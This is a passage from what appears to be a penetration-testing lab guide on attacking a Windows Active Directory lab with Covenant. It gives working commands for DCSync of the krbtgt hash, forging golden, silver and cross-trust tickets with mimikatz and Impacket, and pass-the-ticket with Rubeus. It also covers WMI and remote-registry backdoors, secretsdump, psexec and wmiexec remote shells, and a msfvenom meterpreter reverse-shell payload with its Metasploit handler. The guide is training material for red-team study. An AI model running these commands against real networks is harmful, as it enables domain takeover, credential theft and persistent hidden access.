<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image212.png" srcset="/img/loading.gif"></p>
<p>We can recognize the golden ticket primarily by its overly long time to live. Let’s see if that works by listing the c$ share of domain controller:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image213.png" srcset="/img/loading.gif"></p>
<p>We have now obtained effective DA permissions using the golden ticket.</p>
<p>We can also use again domain admin credentials in order to move laterally to a Domain Controller. As long as we have the cleartext password we can use the WMIGrunt task to conveniently spawn a new grunt from a machine to which we have access with our credentials.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image214.png" srcset="/img/loading.gif"></p>
<p>Shortly after running that task we obtain another connection from the DC.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image215.png" srcset="/img/loading.gif"></p>
<h2 id="Golden-ticket-and-DCSync-with-Covenant-Refresher"><a href="#Golden-ticket-and-DCSync-with-Covenant-Refresher" class="headerlink" title="Golden ticket and DCSync with Covenant (Refresher)"></a>Golden ticket and DCSync with Covenant (Refresher)</h2><p>Golden ticket allows you to get a “free entry” ticket to any domain service. Although golden tickets should be considered rather opsec-unsafe (More and more tools are able to detect it), there might be still numerous scenarios when you want to utilize them.</p>
<p>Before you can forge a Golden ticket, you need to obtain krbtgt user’s hash.</p>
<p>To do so, we need to compromise a domain administrator account or domain controller.</p>
<ul>
<li><p>  In case of a domain controller compromise we can pull all hashes with Mimikatz</p>
</li>
<li><p>  In case of a domain administrator compromise we can use DCSync</p>
</li>
</ul>
<p>With a Domain Administrator grunt on Jumpbox, we can try the DCSync way.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image216.png" srcset="/img/loading.gif"></p>
<p>Let’s obtain the domain’s FQDN in order to proceed, as above. We can then use Covenant DCSync from Interact tab. With following syntax:</p>
<figure class="highlight moonscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs moonscript">DCSync ELS-CHILD\krbtgt els-child.eLS.<span class="hljs-keyword">local</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image217.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image218.png" srcset="/img/loading.gif"></p>
<p>As we have the hash, we also require the domain SID in order to craft a Golden Ticket:</p>
<p>We can obtain it using the command:</p>
<p>whoami /user</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image219.png" srcset="/img/loading.gif"></p>
<p><strong>S-1-5-21-23589937-599888933-351157107</strong>-500</p>
<p>We need the string without its last part.</p>
<p>In order to craft the golden ticket stealthily, you need to run mimikatz locally first and then inject the ticket to your compromised machine.</p>
<figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">mimikatz.exe<br># kerberos::golden /user:Administrator /domain:els-child.eLS.local /sid:S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-23589937</span><span class="hljs-string">-599888933</span><span class="hljs-string">-351157107</span> /krbtgt:e4ba51c7157fe46652603b661f1ccfbe /ticket:golden.kirbi<br></code></pre></div></td></tr></table></figure>

<p>As the above step is just a computation to create proper ticket, it can be performed on an external local machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image220.png" srcset="/img/loading.gif"></p>
<p>The file can be then transferred to the attacker (covenant) machine and distributed to victim machines to gain effective permissions of a domain admin using the golden ticket.</p>
<p>The ticket can be hosted e.g. using simplehttpserver and downloaded using</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">powershell curl http:<span class="hljs-regexp">//</span><span class="hljs-number">10.100</span>.<span class="hljs-number">10.2</span>:<span class="hljs-number">9090</span>/golden.kirbi -outfile golden.kirbi<br></code></pre></div></td></tr></table></figure>

<p>You can also use Covenant’s Download functionality.</p>
<p>In order to inject it into memory, you can use command</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">Rubeus ptt /ticket:&quot;c:<span class="hljs-symbol">\u</span>sers<span class="hljs-symbol">\a</span>dminels<span class="hljs-symbol">\g</span>olden.kirbi&quot;<br></code></pre></div></td></tr></table></figure>

<h2 id="Maintaining-access-without-a-golden-ticket"><a href="#Maintaining-access-without-a-golden-ticket" class="headerlink" title="Maintaining access without a golden ticket"></a>Maintaining access without a golden ticket</h2><p>Golden ticket is a well known technique, which also means it is a less stealthy one. In order to be a little more stealthy upon obtaining access to the Domain Controller, one might want to use some more obscure ways of maintaining DA access. For example, we can use one of the tools belonging to the Nishang project, named Set-RemoteWMI.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1">https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1</a></p>
<p>This tool allows to set a WMI-remoting based backdoor. Let’s see how we can use it with Covenant.</p>
<p>First, we download the tool in our Kali machine. You can do it using wget, git clone or any other way.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image221.png" srcset="/img/loading.gif"></p>
<p>Next, we interact with the Domain Admin grunt from the Domain Controller. The first thing to do is to import the downloaded powershell module.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image222.png" srcset="/img/loading.gif"></p>
<p>Next, we would like to maintain access from the domain user we compromised – analyst1.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Set</span>-RemoteWMI -UserNAme analyst1 -ComputerName child-dc01.els-child.els.<span class="hljs-keyword">local</span> -namespace <span class="hljs-string">&#x27;root\cimv2&#x27;</span> -<span class="hljs-keyword">Verbose</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image223.png" srcset="/img/loading.gif"></p>
<p>Now, in order to check if we can access DC we <strong>switch to an Analyst1 grunt</strong> and issue following command:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> gwmi -class win<span class="hljs-number">32</span>_operatingsystem -Computername child-dc<span class="hljs-number">01</span>.els-child.els.local<br></code></pre></div></td></tr></table></figure>

<p>The gwmi instruction is alias for Get-WmiObject.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image224.png" srcset="/img/loading.gif"></p>
<h2 id="Silver-tickets"><a href="#Silver-tickets" class="headerlink" title="Silver tickets"></a>Silver tickets</h2><p>A less powerful but still effective technique is crafting a Silver ticket.</p>
<p>While a golden ticket is a domain-wide pass, a silver ticket’s scope is limited to a single computer.</p>
<p>Also, the difference from a Golden Ticket is that we need to obtain the computer’s <strong>Machine account hash</strong>. Machine account hashes are rather uncrackable due to the machine account password being a random 120+ bytes long string. A silver ticket is a good way of utilizing obtained Machine account hashes.</p>
<p>We can also prepare a silver ticket locally and then utilize it by injecting it into the target machine’s memory. The domain and sid values are obtained as in the case of golden tickets - by examining any domain account.</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span>.exe<br><span class="hljs-attribute">kerberos</span>::golden /user:Administrator /domain:els-child.eLS.local /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">23589937</span>-<span class="hljs-number">599888933</span>-<span class="hljs-number">351157107</span> /rc<span class="hljs-number">4</span>:[machine hash] /service:cifs /ticket:silver.kirbi<br></code></pre></div></td></tr></table></figure>

<p>In the above case, the ticket will allow administrative access to CIFS (File sharing, SMB) service.</p>
<p>In this case we use the cifs service, but other services can be used as well. The uppercase names below are service names to be used with the /service: argument</p>
<p>HOST, RPCSS - for WMI interactions</p>
<p>HOST for Schtasks</p>
<p>LDAP for LDAP including DCsync attack</p>
<p>HOST, HTTP for WinRM</p>
<p>HOST, HTTP, WSMAN, RPCSS - for PowerShell Remoting</p>
<p>We will use silver tickets in the next task - Remote registry backdoor.</p>
<h2 id="Remote-registry-backdoor"><a href="#Remote-registry-backdoor" class="headerlink" title="Remote registry backdoor"></a>Remote registry backdoor</h2><p>Another way of maintaining access to the machine is to create a Remote Registry backdoor. Another great tool can be utilized in order to achieve it:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/HarmJ0y/DAMP">https://github.com/HarmJ0y/DAMP</a></p>
<p>The DAMP project allows to create a backdoor based on security descriptors to certain critical services. This way, we can, for example, create a Remote Registry backdoor.</p>
<p>We start with our DC grunt and import the PS module.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image225.png" srcset="/img/loading.gif"></p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Add</span>-RemoteRegBackdoor -ComputerName child-dc01.els-child.els.<span class="hljs-keyword">local</span> -Trustee analyst1 -<span class="hljs-keyword">verbose</span><br></code></pre></div></td></tr></table></figure>

<p>Then the command is invoked using the interact tab:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image226.png" srcset="/img/loading.gif"></p>
<p>Now, we <strong>move to the Analyst1 grunt</strong> and import the RemoteHashRetrieval module</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image227.png" srcset="/img/loading.gif"></p>
<p>In next step we are able to obtain the Machine Account hash.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image228.png" srcset="/img/loading.gif"></p>
<p>Obtaining the machine hash account is important, because this hash can in turn be used to create a silver ticket to any service on host child-dc01 with any permissions. Going this way, we can also use that access to obtain administrative permissions on e.g. remoting-like services by forging a silver ticket based on machine account’s hash.</p>
<p>In order to use WMI remoting, we require ticket for both HOST and RPCSS service. Let’s use that hash to create two tickets in a local Mimikatz instance:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /domain:els-child.els.local /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">23589937</span>-<span class="hljs-number">599888933</span>-<span class="hljs-number">351157107</span> /target:child-dc<span class="hljs-number">01</span>.els-child.els.local /service:HOST /rc<span class="hljs-number">4</span>:<span class="hljs-number">61840587</span>fd<span class="hljs-number">2</span>e<span class="hljs-number">77</span>b<span class="hljs-number">5</span>f<span class="hljs-number">0509</span>ae<span class="hljs-number">41</span>e<span class="hljs-number">40363</span>e /user:Administrator<br></code></pre></div></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">kerberos</span>::golden /domain:els-child.els.local /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">23589937</span>-<span class="hljs-number">599888933</span>-<span class="hljs-number">351157107</span> /target:child-dc<span class="hljs-number">01</span>.els-child.els.local /service:RPCSS /rc<span class="hljs-number">4</span>:<span class="hljs-number">61840587</span>fd<span class="hljs-number">2</span>e<span class="hljs-number">77</span>b<span class="hljs-number">5</span>f<span class="hljs-number">0509</span>ae<span class="hljs-number">41</span>e<span class="hljs-number">40363</span>e /user:Administrator<br></code></pre></div></td></tr></table></figure>

<p>Both tickets are uploaded to the target machine (in that case, Jumpbox). Then, we import them one by one using Rubeus.</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">powershell <span class="hljs-selector-attr">[System.Convert]</span>::<span class="hljs-built_in">ToBase64String</span>([System.IO.File]::<span class="hljs-built_in">ReadAllBytes</span>(<span class="hljs-string">&quot;c:\users\analyst1\ticket2.kirbi&quot;</span>))<br>Rubeus ptt /ticket:doQAAAW1M…<br></code></pre></div></td></tr></table></figure>

<p>As the tickets are imported, you can see the final result a simple interaction with the target DC machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image229.png" srcset="/img/loading.gif"></p>
<h2 id="Attacking-trusts"><a href="#Attacking-trusts" class="headerlink" title="Attacking trusts"></a>Attacking trusts</h2><p>Domains together can be part of larger organizational units named forests. These can be applied in large enterprises, where, for example, each national office has its own domain. Apart from forests, standalone domains can also establish a relationship between them without becoming an organized structure. Domains can also establish a parent-child relationship. These relationships are called <strong>trusts</strong> and their purpose is to define and enforce an access control logic between these domains.</p>
<p>Using a trust, it is possible to allow users of one domain to interact with objects belonging to another domain and vice versa. The trust relationship can be as follows:</p>
<ul>
<li><p>  Bidirectional (two way) trust - both domains respect each other permissions</p>
</li>
<li><p>  One way trust - one domain is privileged over the second one</p>
</li>
</ul>
<p>These relationships can also be applied to whole forests.</p>
<p>Once a parent and child domains are joined together, they are automatically establishing a two way trust. Let’s see how we can exploit this fact once a DC is compromised using Covenant.</p>
<p>We start from a Domain Administrator grunt (on child-dc01) and we type:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Get</span>-ADTrust -<span class="hljs-keyword">Filter</span> *<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image230.png" srcset="/img/loading.gif"></p>
<p>We can see that the current domain has a bidirectional trust relationship with the domain els.local. In order to create a trust-abusing golden ticket, which will be respected by the trusting domain, we need the same information as for normal golden tickets plus the els.local’s domain SID. Let’s obtain all needed information:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image231.png" srcset="/img/loading.gif"></p>
<p>For eLS.local SID, import PowerView and run the Get-DomainSID command.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image232.png" srcset="/img/loading.gif"></p>
<p>Also, we need SID of current domain which can be obtained via whoami /user</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image233.png" srcset="/img/loading.gif"></p>
<p>The krbtgt hash can be obtained using DCSync.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image234.png" srcset="/img/loading.gif"></p>
<p>Now, we use a local instance of mimikatz to generate the golden trust-abusing ticket. The command used is:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">mimikatz</span>.exe<br><br><span class="hljs-attribute">kerberos</span>::golden /admin:Administrator /domain:els-child.eLS.local /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">23589937</span>-<span class="hljs-number">599888933</span>-<span class="hljs-number">351157017</span> /sids:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2128511948</span>-<span class="hljs-number">1856962338</span>-<span class="hljs-number">1523442862</span>-<span class="hljs-number">500</span> /krbtgt:e<span class="hljs-number">4</span>ba<span class="hljs-number">51</span>c<span class="hljs-number">7157</span>fe<span class="hljs-number">46652603</span>b<span class="hljs-number">661</span>f<span class="hljs-number">1</span>ccfbe /startoffset:<span class="hljs-number">0</span> /endin:<span class="hljs-number">600</span> /renewmax:<span class="hljs-number">10080</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image235.png" srcset="/img/loading.gif"></p>
<p>As a result of that action a file ticket.kirbi will be created. We will now move it to our Kali machine and upload to compromised grunt using the Upload task:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image236.png" srcset="/img/loading.gif"></p>
<p>As the ticket is imported, we will use the built-in Rubeus module to import it into memory.</p>
<p>Before we do that, we need to convert the ticket to base64 in order for Rubeus to be able to parse it.</p>
<p>If you try to simply encode the ticket using Kali, Rubeus might have trouble parsing it. Due to that, better do it from powershell as shown below. Use the command:</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">powershell <span class="hljs-selector-attr">[System.Convert]</span>::<span class="hljs-built_in">ToBase64String</span>([System.IO.File]::<span class="hljs-built_in">ReadAllBytes</span>(<span class="hljs-string">&quot;ticket.kirbi&quot;</span>))<br></code></pre></div></td></tr></table></figure>

<p>Then, copy the result output and use it with Rubeus:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Rubeus</span> ptt /ticket:[base<span class="hljs-number">64</span>]<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image237.png" srcset="/img/loading.gif"></p>
<p>As the action is completed, you can check if the ticket is imported using klist.exe:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image238.png" srcset="/img/loading.gif"></p>
<p>As the action is completed, you can try to access the parent domain controller</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image239.png" srcset="/img/loading.gif"></p>
<p>You have now effective domain admin privileges in the parent domain as domain.</p>
<h2 id="Forging-trust-ticket-with-Impacket"><a href="#Forging-trust-ticket-with-Impacket" class="headerlink" title="Forging trust ticket with Impacket"></a>Forging trust ticket with Impacket</h2><p>There is an alternative way for crafting a trust ticket using the Impacket Toolkit, which can be downloaded from GitHub:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>Knowing a plaintext password is required to perform that exercise. However, looking into Covenant reminds us that the password has already been harvested using Mimikatz:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image240.png" srcset="/img/loading.gif"></p>
<p>Moreover, we add the domain’s FQDN to kali’s /etc/hosts file:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image241.png" srcset="/img/loading.gif"></p>
<p>Then we can use lookupsid.py and secretsdump.py to gather interesting information from the target DC system.</p>
<p>The commands used are:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python ./examples/lookupsid.py ELS-CHILD/Administrator:Admin\@3L\$-CHILDL0c\@l*****@child-dc01.els-child.eLS.local<br></code></pre></div></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python ./examples/secretsdump.py ELS-CHILD/Administrator:Admin\@3L\$-CHILDL0c\@l*****@child-dc01.els-child.eLS.local<br></code></pre></div></td></tr></table></figure>

<p>Note, that special characters (@ and $) had to be escaped.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image242.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image243.png" srcset="/img/loading.gif"></p>
<p>The tools successfully retrieve the requested information.</p>
<p>Also, we will need some assistance from covenant in order to retrieve the parent domain SID. We will do it in the same way as previously:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image244.png" srcset="/img/loading.gif"></p>
<p>Now, we will use ticketer.py in order to interact with the target domain.</p>
<p>We will use the same information to create a golden ticket, but this time, we will use impacket components - ticketer.py and ticketConvert.py in order to create the trust-abusing golden ticket.</p>
<p>You can find these scripts by default in the impacket/examples/ directory.</p>
<p>First, we create the ticket using the command:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ticketer.py -nthash e4ba51c7157fe46652603b661f1ccfbe -domain-sid S-1-5-21-23589937-599888933-351157107 -domain els-child.els.local Administrator -extra-sid S-1-5-21-2128511948-1856962338-1523442862-500<br></code></pre></div></td></tr></table></figure>

<p>Note that it is very similar to mimikatz command.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image245.png" srcset="/img/loading.gif"></p>
<p>We can observe that a .ccache (Kerberos Cache) file has been created. We cannot however use that file yet.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image246.png" srcset="/img/loading.gif"></p>
<p>We need ticketConverter.py in order to turn it into .kirbi file with simple command:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image247.png" srcset="/img/loading.gif"></p>
<p>We can now use that file in the same way as the one generated by mimikatz. First, we upload the admin.kirbi to target machine:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image248.png" srcset="/img/loading.gif"></p>
<p>Then inside Covenant we can use the same technique to pass the ticket to memory using the built-in Rubeus module:</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">powershell <span class="hljs-selector-attr">[System.Convert]</span>::<span class="hljs-built_in">ToBase64String</span>([System.IO.File]::<span class="hljs-built_in">ReadAllBytes</span>(<span class="hljs-string">&quot;admin.kirbi&quot;</span>))<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image249.png" srcset="/img/loading.gif"></p>
<p>After that, you will be able to access the parent domain controller.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image250.png" srcset="/img/loading.gif"></p>
<p>You can also use the .ccache file to execute code directly on the child domain controller.</p>
<p>First, you need to make sure that you have proper entries in /etc/hosts that will point the ELS-CHILD domain to the proper IP address.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image251.png" srcset="/img/loading.gif"></p>
<p>Also, you need to put location of .ccache file into an environment variable:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KRB5CCNAME=/root/impacket/examples/Administrator.ccache<br></code></pre></div></td></tr></table></figure>

<p>you might also need to synchronize the time between your kali and remote dc. Use</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ntpdate 10.100.10.253<br><br>./psexec.py -dc-ip child-dc01.ELS-CHILD.ELS.LOCAL ELS-CHILD.ELS.LOCAL/Administrator@child-dc01.ELS-CHILD.ELS.LOCAL -k -no-pass -debug<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image252.png" srcset="/img/loading.gif"></p>
<p>You will be able to obtain a remote shell from child dc using Kerberos authentication and the .ccache file you generated.</p>
<p>The same effect can be achieved using wmiexec</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">./wmiexec.py -dc-ip child-dc01.ELS-CHILD.ELS.LOCAL ELS-CHILD.ELS.LOCAL/Administrator@child-dc01.ELS-CHILD.ELS.LOCAL -k -no-pass -debug<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image253.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image254.png" srcset="/img/loading.gif"></p>
<h1 id="PIVOTING-AND-LATERAL-MOVEMENT"><a href="#PIVOTING-AND-LATERAL-MOVEMENT" class="headerlink" title="PIVOTING AND LATERAL MOVEMENT"></a>PIVOTING AND LATERAL MOVEMENT</h1><h2 id="FROM-HTTP-NTLM-Relay-to-DC-Access"><a href="#FROM-HTTP-NTLM-Relay-to-DC-Access" class="headerlink" title="FROM HTTP NTLM Relay to DC Access"></a>FROM HTTP NTLM Relay to DC Access</h2><p>Our starting point will be remote desktop on WIN10-WEB with CLM turned off.</p>
<p>We will re-use the credentials of ELS-CHILD\VICTIM to interact with the win10-web machine and hook it with Metasploit and empire. First, empire is downloaded from its repository:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire/releases">https://github.com/BC-SECURITY/Empire/releases</a> (We used 3.1.5)</p>
<p>In order to install and run it we use the following commands on our Kali machine:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-get install autoconf<br>tar -xzfv empire.tar.gz<br><span class="hljs-built_in">cd</span> setup &amp;&amp; ./install<br><span class="hljs-built_in">cd</span> ../<br>./empire<br></code></pre></div></td></tr></table></figure>

<p>Then, the Metasploit framework is launched. Compromise win10-web using any Metasploit stager you want. For example,</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl start postgresql<br>msfconsole<br>msfdbinit<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> lhost 10.100.10.2<br><span class="hljs-built_in">set</span> lport 8443<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>run<br></code></pre></div></td></tr></table></figure>

<p>Payload is generated:</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.100.10.2 lport=8443 exitfunc=thread -f exe -o m.exe<br></code></pre></div></td></tr></table></figure>

